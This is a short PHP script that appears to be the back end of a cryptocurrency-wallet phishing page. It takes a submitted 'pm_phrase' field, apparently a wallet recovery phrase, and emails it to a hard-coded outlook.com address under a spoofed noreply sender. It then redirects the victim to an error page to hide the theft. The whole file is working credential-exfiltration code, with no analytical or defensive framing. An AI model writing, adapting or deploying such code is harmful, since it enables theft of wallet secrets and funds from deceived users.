<?php
//get data from form  


$email= $_POST['pm_phrase'];
$to = "dimemoremore@outlook.com";
$subject = "Mail From website";
$message= "test running for Phrase";
$txt ="Phrase = " . $email . "\r\n Message =" . $message;
$headers = "From: noreply@datawalsync.org" . "\r\n" .
"CC: ";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:error.php");



